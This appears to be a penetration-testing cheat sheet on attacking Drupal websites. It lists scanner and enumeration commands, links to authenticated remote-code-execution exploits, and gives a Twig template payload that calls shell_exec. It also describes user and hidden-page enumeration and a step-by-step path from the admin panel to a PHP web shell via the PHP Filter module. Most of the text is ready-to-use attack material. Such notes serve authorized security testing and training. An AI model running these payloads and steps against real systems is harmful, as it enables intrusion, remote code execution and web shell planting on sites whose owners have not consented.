# Drupal

```bash
**Tools** 
# droopescan
# https://github.com/droope/droopescan
droopescan scan drupal -u https://example.com -t 32

# drupwn
# https://github.com/immunIT/drupwn
sudo python3 drupwn --mode enum|exploit --target https://example.com

# https://github.com/ajinabraham/CMSScan
docker build -t cmsscan .
docker run -it -p 7070:7070 cmsscan
python3 cmsmap.py -f D https://www.example.com -F

# https://github.com/Tuhinshubhra/CMSeeK
python3 cmseek.py -u domain.com

# Drupal < 8.7.x Authenticated RCE module upload
https://www.drupal.org/project/drupal/issues/3093274
https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz

# Drupal < 9.1.x Authenticated RCE Twig templates
https://www.drupal.org/project/drupal/issues/2860607
"Administer views" -> new View of User Fields - >Add a "Custom text"
"{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}"

# If found /node/$NUMBER, the number could be devs or tests pages

# drupal 8
# https://www.exploit-db.com/exploits/46459

# Check for username disclosure on old versions:
?q=admin/views/ajax/autocomplete/user/a
```

### Normal Scan

{% code fullWidth="false" %}
```sh
droopescan scan -u <URL>
```
{% endcode %}

### **Username enumeration**

{% code fullWidth="false" %}
```
In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<number> you can see the number of existing users :
	- /user/1 -> Access denied (user exist)
	- /user/2 -> Page not found (user doesn't exist)
```
{% endcode %}

### **Hidden pages enumeration**

{% code fullWidth="false" %}
```
Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
```
{% endcode %}

### **Drupal panel RCE**

```
You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
```
